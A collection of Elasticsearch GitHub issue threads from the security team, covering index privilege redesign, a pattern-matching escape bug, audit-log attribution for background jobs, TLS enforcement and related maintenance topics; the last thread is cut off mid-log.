Agreed, we are making breaking changes here as with the new names.
I wanted to highlight the behavior for `update_doc` (specifically the `upsert`) but my sentence was poorly constructed. I have explained below on `update_doc` behavior that I had observed that lead me to that.

> * `index_doc` should not allow the `_update` API. It should behave like the old `create` privilege. The `_update` API is not a standard indexing API and has different security implications. It should not be part of the standard ""indexing"" privilege.

Agreed, this will be similar to `create` privilege.

> * `update_doc` should allow the use of the `_update` API (which is also op_type=UPDATE). I don't think it should allow any other sort of indexing, mostly because the name implies update-only and the principle of least surprise implies that it should therefore be update-only. If admins want index+update (but not delete) then they can grant two privileges.

The `_update` API allows for upserts and this where my confusion is.
The `update_doc` would imply update-only which means no indexing of new documents.

But with this new privilege the behavior that I observed:
- Index API which states `if the document already exists, updates the document` but a user with `update_doc` would not be allowed to do updates using this API.
- Update API that allowed upserts. If we use `script` then it tries to do an index operation that fails to update existing document (which is incorrect, I assume this happens as internally we convert this into an index request)
This is what I was referring to as the breaking thing but did not clearly explain it.I am proposing the following privileges (a little different from an earlier attempt):
- `create_doc`: allows indexing of new documents only no updates. allows update mapping action.
- `update_doc`: allows indexing of document updates. does not allow indexing new documents. 
allows update mapping action. This should work with Index and Update APIs
_to support this we can think of introducing request based index privilege so authorization engine can look at the request and deny requests with scripts? Index API might require some changes to support this?_
- `index_doc`: this is similar to existing `index` privilege and allows indexing new documents, updates, upserts plus update mapping action.
- `delete_doc`: similar to `delete` privilege
- `write_doc`: similar to `write` privilege
- `read_doc`: similar to `read` privilege
- `read_doc_cross_cluster`: similar to `read_cross_cluster` privilege

`create` privilege could then use `update_doc` privilege as a replacement as the behavior would be maintained (avoiding any leaks when using scripts)

thoughts?I still maintain that `index_doc` should not support `_update`.

People will expect that ""index_doc"" is the privilege that they want if they're ingesting data (and can't guarantee that it will be new docs only).
However, the Update API implicitly supports reading existing data which is a surprising behaviour and should not be included in standard indexing privilege.
 I see your point, in that case, I propose the following:
- `index_doc`: `create_doc` + `update_doc` (given that the `update_doc` would not allow scripts)
- `upsert_doc`: which is similar to the old `index` privilege. (If we want to have something like `index` privilege). [The naming could be different but to me, this one seemed to set the expectation right.]Do we see much demand for update without script? 
It's true that the ability to run scripts against the existing doc, is the primary reason why the update API has non-obvious security implications, so I agree that a non-scriptable update is safer and is probably safe enough to support being in a ""normal"" privilege.

_But_, is it valuable enough to build & maintain?> If we want to have something like index privilege

I _think_ we need a privilege that allows the full `_update` API without allowing deletes. Technically an update (or even just index over an existing doc) can blank out all the fields and effectively delete a doc, but I think users will expect to have a way to grant scriptable updates without granting delete.
I don't care strongly about whether that privilege grants all indexing APIs, or only the update API (mostly I think it comes down to having the name and the access be in alignment), but I don't think we can say that `write_doc` is the only privilege that grants Update API.

Happy to be convinced otherwise though.I wonder if we should even have an `update` privilege or if we can decompose that into `read` + `index` (+ `delete`). If we consider `update` just as a shortcut for `read` + `index` (or possibly `delete` in case of scripted updates), perhaps all those privileges should be granted for now if someone wants to use updates. We can then later work on more fine-grained `update` permissions if the need arises for those.Thank you @tvernum and @ywelsch for your comments.

> if we should even have an update privilege or if we can decompose that into read + index (+ delete)

I think decomposing update privilege might not be that easy to achieve due to the current privilege model. Our privileges work on the action patterns and given that we can do a combination of operations like create, delete, update on the documents via scripts, it would be a trivial task to achieve this as we would need to authorize not just based on action names but also looking at the request object. We would need to think about changes to the authorization engine/model and we would not want to visit this just with this use case in mind.

> Do we see much demand for update without script?

It's hard to tell and it might depend on the use case. If the use case has frequent updates
then the users might prefer upserts and the related hints (I am unsure of this though as we do not give any recommendation in our [tune for indexing document](https://www.elastic.co/guide/en/elasticsearch/reference/master/tune-for-indexing-speed.html)).

> I think we need a privilege that allows the full _update API without allowing deletes

Scripts, if not used properly, could have a performance impact and maybe the reason that we have kept update action separate. If we say that update with scripts as an advanced option available for users then I agree we should consider it as a separate privilege.

Following is what I propose based on the discussions:
- `create_doc`: allows indexing of new documents only no updates. allows update mapping action.
- `index_doc`: allows indexing of new documents and overwriting documents, allows update mapping action. This does not allow update action via Update/Bulk API.
- `index_update_doc`/`upsert_doc`: this allows indexing, updating documents via Index/Bulk/Update API and allows update mapping action. **_The naming could be different, any suggestions?_**
- `delete_doc`: similar to `delete` privilege

We are not considering granular `read` privileges and so keeping the privilege names the same. So when we revisit the privilege in future we can consider apt naming for it. The read privileges `read`, `read_cross_cluster` will remain the same.

As discussed above, `write` privilege name gives access to index, update, delete documents and that can be achieved by combining the privileges that exist. For example, `upsert_doc` + `delete_doc` would give a privilege that is equivalent of `write` privilege. So we can think of dropping the write privilege.

From the migration point of view, the following is the mapping:

| Existing Privilege  | New Privilege | isExactReplacement
|---------------------------------------------|----------------------------|---------------------------------------------------------|
| `create` | `index_doc` | true |
| `index` | `upsert_doc` | true |
| `delete` | `delete_doc` | true |
| `write` | user will need to do `upsert_doc` + `delete_doc` we could consider adding `read_write_delete_doc` privilege| false |My main qualm with the API-oriented privileges (create/index/update, with all the variations of what update can do) is that they allow the user to restrict what APIs they might call. This is unrelated however to the effects that those APIs have. I find it more interesting to limit what changes the users can do to the data (with the basic ones being: only allows creations of new documents / allow overriding of documents / allow reading documents / allow deletion of documents).

> I think decomposing update privilege might not be that easy to achieve due to the current privilege model. Our privileges work on the action patterns and given that we can do a combination of operations like create, delete, update on the documents via scripts ...

An update is internally already a ""get"" + ""index"". Perhaps we could internally use transport actions for those steps so that they can be captured by the action patterns. The `indices:data/write/update*` would then just be similar to `indices:data/write/bulk`, i.e. a container for the actual actions. This would allow a more fine-granular model, e.g. a scripted delete (i.e. update script that explicitly sets `ctx.op = 'delete'`) would only read + delete privileges.

> As discussed above, write privilege name gives access to index, update, delete documents and that can be achieved by combining the privileges that exist. For example, upsert_doc + delete_doc would give a privilege that is equivalent of write privilege. So we can think of dropping the write privilege.

I might still be convenient to have this ""all things allowed privilege"". Perhaps we can just call it `all_doc` (allows all document operations).Thank you @ywelsch for the comments.

> Perhaps we could internally use transport actions for those steps

This is interesting as it did come up during my discussion with @tvernum and we did think that if internally we used the transport actions, then it becomes easier from a security perspective and we can enforce granular model. But it seemed that we have avoided using transport actions maybe for other reasons (like performance), pardon my knowledge here.

We are trying to target these changes for the upcoming release, do you think we would be okay to modify the current behavior, how big of this change would be to start using transport actions?
 
> convenient to have this ""all things allowed privilege""

Yes, we can consider adding such privilege as a convenience.Just an update, I talked to @ywelsch offline and seems like we might be able to use transport actions internally for the steps that update action does in a way such that there are no performance degradation or missing functionality. I have started to explore the approach and with help from Yannick will come up with a draft PR where we can discuss.@elastic/es-security is anyone going to be picking this up for 7.6? We're dependent on the ES API to determine which index privileges are deprecated in https://github.com/elastic/kibana/issues/46609I'm checking in to see if this is still something we eventually want. I'm grooming Kibana's backlog, and I'd like to know if we should keep our [associated issue](https://github.com/elastic/kibana/issues/46609) open@legrego We discussed this in the ES Security team weekly sync on the 4th of Aug . Overall we do not plan to rename or remove any of the doc index-related privileges.
Renaming privileges to append `_doc` would overall create a more consistent naming scheme, but the two would have to coexist for a long time which would on the contrary, clutter the user experience in the long interim.
Also, there was no consensus as to which privilege should we remove out of `create_doc`, `create`, `index` and `write` .

If we sometimes decide we want to phase out some privileges, there is the `/_security/privilege/_builtin` API that we should maintain to return a list of valid and preferred privileges.
   Pinging @elastic/es-security (Team:Security)Thanks for the update, @albertzaharovits. I'll close out our associated issue since there are no plans at this time to move forward with index privilege deprecations. I am happy to re-open if the need arises in the future.",no,">enhancement,Meta,>deprecation,:Security/Authorization,Team:Security,"
elastic/elasticsearch,820711904,"Escape char not handled for patterns categorised as exact match","In #36017, we opitmised index matching performance by splitting the patterns into two categories: exact match and non-exact (wildcard) match. `Set.contains` was used for exact matches and `Automaton` is used for non-exact matches. The issue occurs when a pattern contains the escape char (`/`), which is handled [specially](https://github.com/elastic/elasticsearch/blob/7.12/x-pack/plugin/core/src/main/java/org/elasticsearch/xpack/core/security/support/Automatons.java#L235-L242) (basically gets dropped) when building the automaton, but passed through unchanged when building the exact match Set.

For example:
* The pattern `ab\c` and `ab\c*` do not both match `ab\c`. In fact, only the former exact match pattern `ab\c` does. The pattern `ab\c*` result in an automaton that matches `abc*`.  
* Similarly, the pattern `abc\` matches exactly `abc\` while `abc\*` matches exactly `abc*`. 
* Also, between patterns `abc\` and `a*c\`, only the former matches `abc\` while the later cannot match any string that ends with a `\`.

In addition to the above bug, there is also a _tiny_ missed opportunity for optimisation:
https://github.com/elastic/elasticsearch/blob/c7ad73778772b5e767972381f69619f083a08d64/x-pack/plugin/core/src/main/java/org/elasticsearch/xpack/core/security/support/StringMatcher.java#L93-L97

If the chars `*` or `?` is immediately after an escape char (which itself is not immediately after an escape), the pattern is in fact an exact instead of a non-exact match.
","Pinging @elastic/es-security (Team:Security)",no,">bug,:Security/Security,Team:Security,"
elastic/elasticsearch,583966701,"Consistent error when security is disabled","Hey folks,

In 7.x (`0e2e06bd7e1452f677497c97cc0fbbba07ad3567`), I get this kind of error when security is disabled:
```
cbr-mbp:kibana chris$ curl -XPOST localhost:9200/_security/user/_has_privileges -H 'Content-Type: application/json' -d ""{}"" -s | jq
{
  ""error"": {
    ""root_cause"": [
      {
        ""type"": ""invalid_index_name_exception"",
        ""reason"": ""Invalid index name [_security], must not start with '_', '-', or '+'"",
        ""index_uuid"": ""_na_"",
        ""index"": ""_security""
      }
    ],
    ""type"": ""invalid_index_name_exception"",
    ""reason"": ""Invalid index name [_security], must not start with '_', '-', or '+'"",
    ""index_uuid"": ""_na_"",
    ""index"": ""_security""
  },
  ""status"": 400
}
```

However, in master (`03caeaad79bd29bda66f3af70791b06fc67a5e4f`), I get this error:
```
cbr-mbp:kibana chris$ curl -XPOST localhost:9200/_security/user/_has_privileges -H 'Content-Type: application/json' -d ""{}"" -s | jq
{
  ""error"": ""no handler found for uri [/_security/user/_has_privileges] and method [POST]""
}
```

This is related to https://github.com/elastic/elasticsearch/pull/50298 and it'd be nice to return a consistent error message across all versions of Elasticsearch. In an ideal world, this error message is less opaque and more specific about security being disabled.","Pinging @elastic/es-security (:Security/Security)Given the dynamic nature of security's enabled state due to different defaults depending on license level, we sometimes will have the handler registered even though security acts disabled. Because security has this unique behavior, we should register all security handlers all the time, regardless of the enabled state, and return an appropriate error response from them when security is disabled.To add to this issue, I get two different errors on master (1eb0047f4f191b516fa9e4a0845aa8606f2bfffb) from the endpoint based on security configs.

With:
```
xpack.security.enabled: false
```
Hitting `http://localhost:9200/_security/user/_has_privileges` yields:
```
{
""error"": ""no handler found for uri [/_security/user/_has_privileges] and method [GET]""
}
```

With all settings commented out in `elasticsearch.yml`, hitting `http://localhost:9200/_security/user/_has_privileges` yields:
```
{
  ""error"": {
    ""root_cause"": [
      {
        ""type"": ""parse_exception"",
        ""reason"": ""request body or source parameter is required""
      }
    ],
    ""type"": ""parse_exception"",
    ""reason"": ""request body or source parameter is required""
  },
  ""status"": 400
}
```

Is there a timeframe for a fix for this? I'm wondering if I just need to instruct Kibana to be aware of all of these permutations. 
There isn't any timeframe for when this will become consistent. Doing so will require a thorough analysis of all security rest handlers. In the mean time, having Kibana be aware of the possible outcomes sounds like a good idea.",no,":Security/Security,Team:Security,"
elastic/elasticsearch,317454180,"Security Audit Log To Record Specific Properties of the Response","*Original comment by @skearns64:*

There are some audit cases where users want the audit logs to contain properties from the response - specifically the number of hits, the number of documents returned, and took_time. This issue tracks adding this information as optional (off by default) to the audit log.


","*Original comment by @uboness:*

just to note here... today we don't have a way to correlate responses with their original requests. Not sure if it's required here, but if it is this will require additional thinking behind this feature. 
*Original comment by @skearns64:*

In this case, I don't think there is a requirement to link request with response, as long as we can log the User with the response details.

Eventually, it would be excellent to be able to link the request with the response. Perhaps by taskID? (do we have task ids for individual requests?)
*Original comment by @uboness:*

not every request is associated with a task and multiple requests/responses can be associated with the same task. The one thing that binds a request to a response is the request ID which is generated on the transport layer, while the security filtering happens before that (at least that's how things work today... hence the need for additional thinking/work to create this association)
We had a brief discussion about this in our team meeting, and I've been tasked with sorting it out.

It is true that we still cannot correlate a request with a response - yet it is also true that this is not imperative in this case. Strictly speaking it's the `user` ( and maybe `request_body`) and `response_body` connection that is relevant. Moreover this is particular to search requests.

First of all, there is no unique id for a `RestRequest`, as there is for a `Task`, so a log entry of a response would not have a way to link to an id of a request. Therefore, either we add serial numbers to requests (and log them when we also log the `request_body`) or the new log entry should contain both the request and the paired response. Both alternatives require some work. The former would be interesting because `Tasks` are spawned from `Requests` and in a grander scheme of things we could fit tasks and requests in a *session*. The latter, more pragmatic to the issue at hand, should wrap the `ActionListener<SearchResponse>` in another listener which also packs the request and the log trail pipe. I reckon `SecurityActionFilter#apply` would be the place to hook in the wrapping listener. Also, the `user` should be available there to pack him together too. It sounds a little convoluted, but this is because security has been concerned with ingress (request filters...) and the whole plumbing is out reach by the time the response is ready to be sent.

But the `user` does stir up an interesting question: Suppose that we have a log line that contains the `request_body` and the response details we want, moreover `X-Opaque-Id` would also be there. Should this entry be an audit log entry? I does not look so to me. It could just as well be an entry in the `elasticsearch.log`.
Now, if we throw in the requirement that responses have to be ascribed to the `user`, as a precursor to an accounting feature, then from this perspective, it is indeed more of an audit log entry.

@skearns64 @elastic/es-security 
I wonder, will the `X-Opaque-Id`, `request_body` and response parameters (hits, time, shards...) in a new log entry, be enough to meet this request? In other words can we keep the `user` out of it? In this case, the log entry can also be forwarded to the usual `elasticsearch.log` and the feature can sit in OSS.

",no,">feature,:Security/Audit,Team:Security,"
elastic/elasticsearch,260367462,"Add documentation to call out that the search templates need explicit script support.","<!--

** Please read the guidelines below. **

Issues that do not follow these guidelines are likely to be closed.

1.  GitHub is reserved for bug reports and feature requests. The best place to
    ask a general question is at the Elastic [forums](https://discuss.elastic.co).
    GitHub is not the place for general questions.

2.  Is this bug report or feature request for a supported OS? If not, it
    is likely to be closed.  See https://www.elastic.co/support/matrix#show_os

3.  Please fill out EITHER the feature request block or the bug report block
    below, and delete the other block.

-->

<!-- Feature request -->

**Describe the feature**:
> In a use case where scripts being registered globally. That does make Elasticsearch multi tenancy impossible since any user (given script permissions) could overwrite any other user's script.
>
> ES currently doesn't support search templates in the cluster due to the global script permission required.  Such as creating a search template with reduced security privileges.
> 
> (Elasticsearch documentation should state that regarding which privileges are needed for search template creation if any.)
> 
> It would be nice if the search template documentation called out which xpack privileges were required for use.  The docs should call out that the search templates need explicit script support.
> 
> There is no x-pack security functionality for controlling access to individual stored scripts.  It's a global read/write privilege.  We should document or mention this in our documentation.



","Pinging @elastic/es-securityIn FixItFriday the consensus was that this falls under security documentation.@jaymode Please feel free to re-assign if you're not the best person to do this.[doc-issue-triage]",no,">docs,:Security/Security,Team:Security,"
elastic/elasticsearch,317447682,"Add option to trust default system certificates","*Original comment by @jaymode:*

In addition to self-signed certificates, it is desirable to trust the system defaults when acting as a client (for example remote monitoring and watcher). We have the infrastructure in place to do this, we just need to make this configurable and add these additional trusted certificates.

One reason we don't do this today when specifying a truststore or certificate authorities is because we rely on the trusted certificates as the authentication mechanism for node to node communication. We can default trusting the system certificates to false for transport ssl but for client ssl like monitoring and watcher we can default it to on. This gives us the protection on the transport layer and the ease of use on the connections made externally.","*Original comment by @bohyun-e:*

cc: @pickypg*Original comment by @joshbressers:*

@tvernum This is related to your comment about changing TLS certificate trust. Do you know if this change has happened yet?*Original comment by @tvernum:*

@joshbressers, no it hasn't happened yet.*Original comment by @gmoskovicz:*

Isn't this a duplicate of LINK REDACTED ?*Original comment by @albertzaharovits:*

@gmoskovicz this is a refinement of LINK REDACTED as this proposes to check the implicit JDK trustore only when ES is acting as a client and not for node to node communication.

@jaymode if we trust the JDK trustore implicitly, then there's no way we can configure to not trust it with the current configuration syntax. Moreover, this has not been discussed/pushed for other components in the stack. Should we still keep this around ?*Original comment by @jaymode:*

Yes we should still keep this one around. There is value to doing this and it can simplify some things with watcher and monitoring.subscribe",no,">enhancement,:Security/TLS,Team:Security,"
elastic/elasticsearch,760208484,"WIP: Fix inconsistency about TLSLicenseBootstrapCheck - allow existing clusters to be restarted","https://github.com/elastic/elasticsearch/issues/48912","<!-- CLA-CHECK:66094 -->
&#x1F49A; CLA has been signed@AronNovak thanks for your contribution, but it is extremely unlikely that we will merge this change.
We intentionally enforce TLS at the transport layer as it is our mechanism for controlling cluster membership. We do not wish to make it optional.
Pinging @elastic/es-security (Team:Security)I see and it makes a lot of sense. Then what needs to be done IMHO is to prevent the confusing situation that you have a fully working cluster that you cannot upgrade / maintain due to this. Probably it should be enforced always simply.If you are running ElasticSearch in eg. Kubernetes with ServiceMesh and mTLS it's really painfully to run another TLS tunnel inside a mTLS tunnel.
There should be a way to disable this as it makes no sense to encrypt the traffic twice.

It also doesn't make sense:
http basic is allowed unencrypted where api keys are not.
so either allow both with HTTP (and maybe post a warning or make it possible to ignore it) or block all auth and don't do it partially.

nowadays with Kubernetes with NetworkPolicies and ServicesMesh this enforcement just feels wrong.@tvernum Intentionally forcing TLS at the transport layer is not ideal. The customer should have the option to disable the use of TLS within ElasticSearch. There are valid use cases for this...

One such use case is as @mblaschke mentioned. We are similarly running ElasticSearch in containers, except we are running on Nomad and using Consul for our ServiceMesh. Thus while TLS would be ""disabled"" within ElasticSearch, all traffic between the containers is with mTLS. This is actually more secure than having to use ""static"" TLS certificates within ElasticSearch itself.

We do not need, nor do we want to have to run/enable, and additionally manage, TLS inside ElasticSearch. I really hope Elastic rethinks their current approach, and gives the choice back to the customer.",yes,":Security/TLS,Team:Security,"
elastic/elasticsearch,317447196,"Error messaging needs improvements for nodes w/o a license","*Original comment by @andrewvc:*

I just spent a large amount of time debugging this issue https://github.com/logstash-plugins/logstash-output-elasticsearch_java/issues/28#issuecomment-161086... . The root cause was logstash being used w/o the license plugin to connect to Elasticsearch with marvel installed.

The initial error was that there was no master found (as you can see in the ticket). This behavior is extremely painful and confusing for users. Ideally both Elasticsearch and the client would log a new license failure exception in this case that would give a clear reason for the issue.

Thoughts?


",,no,">bug,:Security/License,Team:Security,"
elastic/elasticsearch,387442772,"Better error messages when some nodes don't have security enabled","Right now if you configure security and *don't* set `xpack.license.self_generated.type` to `trial` then configure security it is quite possible to end up with a cluster that won't fully form. The master nodes will come up, and, when `minimum_master_nodes` of them have shown up, they'll self generate a `basic` license. This basic license will cause security to disable itself and then other nodes that connect to it won't join the cluster because the master doesn't send an authentication token.","Pinging @elastic/es-securityRelates: #42153",no,":Security/Security,Team:Security,"
elastic/elasticsearch,564656051,"Audit log entry stale username field","The `username` audit field, which is present in most audit entries, might not reflect the authentication status when the entry is recorded.

Actions are first authenticated, and then continue execution (after authorization) using the point-in-time authentication. This is not a problem for one-off short lived actions.

But there are two broad situation where this behavior is confusing:

- when ML datafeed and watcher search input (possibly other, eg rollup) background jobs are audited, the `username` field reflects the authentication that has been performed when the job has been created.
- audited actions when using API keys, will show up with the `username` that created the API key.

These cases are confusing because the authenticating users might change (have a different set of roles) or might even be deleted, yet they still show up in the audit log as active.

Auditing the user roles, see https://github.com/elastic/elasticsearch/issues/30032, and documenting this limitation might be enough?

Otherwise, I think, the ""best"" fix is to audit the creation of background jobs and API keys, attribute them an username-like identifier (which is included in the audit entry for the job/key creation), and use that identifier in all subsequent actions associated with the job/key. But there are more details we need to has out, for example the `username` (unlike the username-like identifier) allows for easiest attribution (when the authentication is not stale), so maybe keeping the field and signaling in some other way that the user might have changed is a better way.
 ","Pinging @elastic/es-security (:Security/Audit)Another option is to record the timestamp of the authentication. So in these cases, the audit entry would contain a timestamp for eg. authorization and a timestamp for authentication.For this particular issue, I personally think 1) better documentation and 2) adding more description in the logs (e.g. timestamp as Albert suggested) would probably suffice. 

But the ""point-in-time"" authentication (and to some extent authorization since role names are snapshot'd as well) could be a deeper issue to talk about. This [issue](https://github.com/elastic/elasticsearch/issues/52244#issuecomment-585365403) touches it as well. I am not suggesting any actions. More of trying to understand people's thoughts on this.I think
- the `username` we audit is the correct one (a recurring background task like a ML datafeed _is_ running on behalf of that user). I don't think we should mess with it
- including in the audit record that this is some sort of ""background job"" that runs without an explicit authentication event would be helpful. It's more explicit, and would assist in many of the cases where audit logs are needed. If that ""flag"" should refer to the job (e.g. `watcher-watch-foo`, `ml-datafeed-bar`) that would be even better.
- for non-API key audit records, the roles we audit are the correct names (they are the roles that this is executing under) even if that user no longer has those roles. The ""background job"" might be enough make that scenario explicit, but if there's another flag that would be useful to add, I would have no objections.
- for API keys, our audit records have a gap. API keys don't have named roles, they have privileges, and we ought to audit them more precisely (I think this point should be split into a separate issue).
- adding the timestamp for the authentication is interesting, but I wonder if really helpful. Happy to discuss.
 > including in the audit record that this is some sort of ""background job"" that runs without an explicit authentication event would be helpful. It's more explicit, and would assist in many of the cases where audit logs are needed. If that ""flag"" should refer to the job (e.g. watcher-watch-foo, ml-datafeed-bar) that would be even better.

+1

> Another option is to record the timestamp of the authentication. So in these cases, the audit entry would contain a timestamp for eg. authorization and a timestamp for authentication.

> adding the timestamp for the authentication is interesting, but I wonder if really helpful. 

I don't dislike it either, but thinking out loud here: Doesn't this fall outside the scope of audit logging ? It feels like we're providing this as an explanatory piece of information, in order to help the reader of the log to realize how background jobs authentication works. From an audit perspective, isn't the original authentication audited already ? (when it happened )> Doesn't this fall outside the scope of audit logging ?

I think it does, unless we're saying it's a proxy for a ""session"", so you can correlate your authz audit events back to the original authc event. That's a reasonable feature in an audit log.An Elastic support engineer directed me to this topic. I've been using Elasticsearch for over a year, for work. We have auditing enabled, as a requirement from our security department.

Recently I enabled CCR. I found it very confusing that the CCR entries from the audit log had as 'username' the person that configured the replication. Also, the number of audited events was huge. The solution was to create a dedicated CCR user with limited permissions and configure the job with this one (then ignore/filter this user from auditing).

In a similar scenario are ML jobs. I recently restarted an old ML job; it ran overnight and analysed a large amount of data, during which it also audited heavily (30GB in only a few hours). This put more pressure than I expected on the cluster, as various alarms were triggered. It took me a while to find out the cause - because even if I was logged in with my own user when restarting the datafeed, this particular job had been created by the _elastic_ user. Also, there was no idicator that it was a ML job. All I had was the request type _InternalScrollSearchRequest_ and event type _transport_.

So +1 on the below:
> including in the audit record that this is some sort of ""background job"" that runs without an explicit authentication event would be helpful. It's more explicit, and would assist in many of the cases where audit logs are needed. If that ""flag"" should refer to the job (e.g. watcher-watch-foo, ml-datafeed-bar) that would be even better.

To be honest, I wasn't expecting CCR or ML to be executed & audited with the user that created them. I assumed there would be an internal user for this (just like we have beats_system, apm_system etc). 
Because once created, these jobs aren't executed by user X, they are ran by ""the system"".

Not to mention AD integration - you have a user today configuring ML jobs. The next day the user leaves the company and is deleted from AD (the elasticsearch cluster has no control or awarness of this). You now have ML jobs running as user X that doesn't even exist, and this is, imo, wrong.Thank you for the insights @alexPolisevschi . Much appreciated!

We've discussed this inside the team probably a month ago, but I've unfortunately deferred to update this thread.

The consensus was on the lines of what has been mentioned already in the thread, keeping in mind that auditing API keys and background jobs are distinct issues, ie :

- find a way to link the audit records to the background job that they are ascribed to
- document this behavior, similar to how ML does for data feeds https://www.elastic.co/guide/en/machine-learning/current/ml-dfeeds.html#ml-dfeeds

In addition, after further thought and after considering the feedback from @alexPolisevschi , I wish to contend @tvernum's 
> the username we audit is the correct one (a recurring background task like a ML datafeed is running on behalf of that user). I don't think we should mess with it

I think the intuition is that background tasks are executed ""by the system"", not by the user. The exponent example for this argument is the `ShardFollowTaskExecutor` for CCR, which does an indices stats on the remote cluster.
I also think that because the audit entry contains the roles, which confer the privileges that the task is operating under, as well as the `username` which might be assigned a different set of roles at the time when the audit record is produced, can give rise to confusion about what exactly the privileges of the task are.
This is in addition to the confusion, which has been discussed already, that the `username` can reference retired users.

I propose we keep the `username` designation only for synchronous actions, and instead use the `started-by-username` designation for background jobs (audit records of background jobs would not contain a `username` field anymore). @tvernum @jkakavas @ywangd @alexPolisevschi May I get your thoughts on this proposal? Regarding [audit log ignore policies](https://www.elastic.co/guide/en/elasticsearch/reference/current/audit-log-output.html#audit-log-ignore-policy) I believe they should continue working as they currently do, and filter audit logs of background jobs of specific users (even if the audit entry does not contain the `username` field, but contains the `started-by-username` field).

In terms of implementation details, we'll have to adjust the `client` thread context of the background tasks. The audit log would then interpret this thread context change, and slightly alter the audit entry, as described above, to signal that this corresponds to a background task. For reference here are all the background tasks I've been able to track down:

- shard follow task
- transforms
- ML dataframe analytics
- ML datafeed
- ML jobs
- rollup jobs (all the above are subclasses of `PersistentTasksExecutor`)
- Watcher Index action (`ExecutableIndexAction`)
- Watcher Search input (`ExecutableSearchInput`)

Other uses for tasks such as enrich policies are out of scope, since they are synchronous by comparison.

> I think the intuition is that background tasks are executed ""by the system"", not by the user

That may be the inituition, but it's not the reality from a security point of view. A running job has the privileges of the user that created it. Different tasks run with different sets of privileges and may do different things. 
I do not understand the desire to hide that or pretends it's not true.

> I propose we keep the username designation only for synchronous actions, and instead use the started-by-username designation for background jobs (audit records of background jobs would not contain a username field anymore). @tvernum @jkakavas @ywangd @alexPolisevschi May I get your thoughts on this proposal? Regarding audit log ignore policies I believe they should continue working as they currently do, and filter audit logs of background jobs of specific users (even if the audit entry does not contain the username field, but contains the started-by-username field).

I do not understand why introducing a new field, to record exactly the same information, and behave in exactly the same way, would be a gain here.
It doesn't reduce the ""noise"" in the audit log, it doesn't remove the fact that it could reference a  user that no longer has access, it feels like a change for the sake of change without solving any real problem.

 I agree that the ""system user"" seems to be the right concept but lacks of concrete entity in these use cases. Privileges required by these jobs cannot be covered by a single system user since they always involve user data. My understanding is that we will never grant system users permissions for user indices. So it's not possible to assign a system user for it. Sure the superuser can do everything, but I'd argue using superuser to configure these things is a problem by itself and should be fixed separately.

The original problem seems to have two asks:
1. Somehow make it clear that the username in audit log is the one who create the job
2. An easy way to filter the audit log when a more common user (e.g. elastic) is used to create the job.

Instead of trying to move around the username, I wonder if it is possible to add another flag in the audit log entry to indicate it is triggered by the system (task or other origin etc.). This could help differentiate a background task from a synchronous one (with help from documentation improvement). And also allow filtering using this new flag?> A running job has the privileges of the user that created it. Different tasks run with different sets of privileges and may do different things.
I do not understand the desire to hide that or pretends it's not true.

The privileges under which a task runs are **entirely specified** by the `roles` field.
The `username` field of audit entries indicates a slightly different thing, and what exactly that thing is should inform the name of the field, and even more, it's existence. I am arguing that changing the name of the `username` field would, on the contrary to hiding the set of privileges, highlight that it's the `roles` that matter not the user that started the task.

>  do not understand why introducing a new field, to record exactly the same information, and behave in exactly the same way, would be a gain here.
It doesn't reduce the ""noise"" in the audit log, it doesn't remove the fact that it could reference a user that no longer has access, it feels like a change for the sake of change without solving any real problem.

The field name, even if it has the same value, still has importance. For example, if the field is renamed to `started_by_username` it should reduce the confusion because a task can be _started by_ a defunct user but not _executed_ by one.

> Instead of trying to move around the username, I wonder if it is possible to add another flag in the audit log entry to indicate it is triggered by the system (task or other origin etc.).

I think this has been agreed upon already. I'm sorry if this was not clear, but renaming the `username` field suggestion is **in addition** to the introduction of a new field that names the background task.

I understand the reluctance to renaming the `username` field of audit entries for background tasks. I think that if the audit entries of background tasks are clearly distinguishable from audit entries of synchronous ones (as they should be if we add a new field), the `username` field can implicitly have two slightly different meanings, i.e ""executed by"" and ""started by"", without the actual rename or stirring confusion.
I will proceed to adding the new audit field and documenting the behavior.


I am coming back on this issue after a year, as I have another case.

For index management, we were using curator, however we are currently transiting to ILM. The curator jobs are executing with a dedicated ""curator"" user, so in case of a DELETE index action, it's easy to identify if it was the curator index management job or a manual action (a user with sufficient permissions manually deletes the index). 
This is a production scenario, as I recently had to investigate the case of a DELETE index action using the audit logs. 

I am now concerned that after switching to ILM, there won't be a way to make a difference from a manual deletion vs ILM deletion, unless we are very careful and always create ILMs with a dedicated user with the appropriate permissions. This is a workaround is not perfect, since in this case we won't have an audit record of the person that created the ILM definitions.@alexPolisevschi Thank you for the feedback!
I think you're right, we really have to improve our standing in this regard.

We can't commit to a release, but your input is helpful in managing relative priorities. Thank you!And idea occurred to me while re-reading these parts of the discussion:

> I think the intuition is that background tasks are executed ""by the system"", not by the user.

> A running job has the privileges of the user that created it.

> I agree that the ""system user"" seems to be the right concept but lacks of concrete entity in these use cases

Perhaps we should think of this as a run-as scenario.
We could transition background tasks to be authenticated by `_system` (or even better `_system_watcher`, `_system_ml`, etc) running as the original user.

I've given it about 3 minutes of thought, so treat it as an idea rather than a proposal, but it seemed interesting enough to write down.",no,">enhancement,:Security/Audit,Team:Security,"
elastic/elasticsearch,1054785951,"Deprecation of the built-in apm_system user and role","APM is switching to a new monitoring flow since 7.16 (https://github.com/elastic/apm-server/issues/5987). This new flow doesn't require the `apm_system` user anymore.

We can deprecate the `apm_system` user and the `apm_system` role, and then eventually remove in a future release.","Pinging @elastic/es-security (Team:Security)https://github.com/elastic/kibana/issues/116760 is very closely related to thisIt should be safe to deprecate in 7.16 or 8.0, but since we're past feature freeze, it may be necessary to wait for 8.1.",no,">deprecation,:Security/Authorization,Team:Security,"
elastic/elasticsearch,840264901,"[CI] OutOfMemoryError in ESLoggingHandlerIT with FIPS enabled","I've seen this happen twice now. Since the build blows up with an OOME I don't have a build scan to share. Here's the Jenkins jobs.

https://elasticsearch-ci.elastic.co/job/elastic+elasticsearch+7.x+matrix-java-periodic-fips/ES_RUNTIME_JAVA=zulu11,nodes=general-purpose/94/console

https://elasticsearch-ci.elastic.co/job/elastic+elasticsearch+7.12+matrix-java-periodic-fips/ES_RUNTIME_JAVA=java11,nodes=general-purpose/69/console","Pinging @elastic/es-security (Team:Security)Happened again: https://elasticsearch-ci.elastic.co/job/elastic+elasticsearch+7.12+matrix-java-periodic-fips/ES_RUNTIME_JAVA=openjdk15,nodes=general-purpose/72/consoleUnfortunately we aren't capturing the heap dump anywhere. I'm looking at a way to do this but my intuition is that test is producing some obscene amount of log output.Not sure if these all have the same cause.. 

The zulu11 one fails with a StackOverflow Exception
```
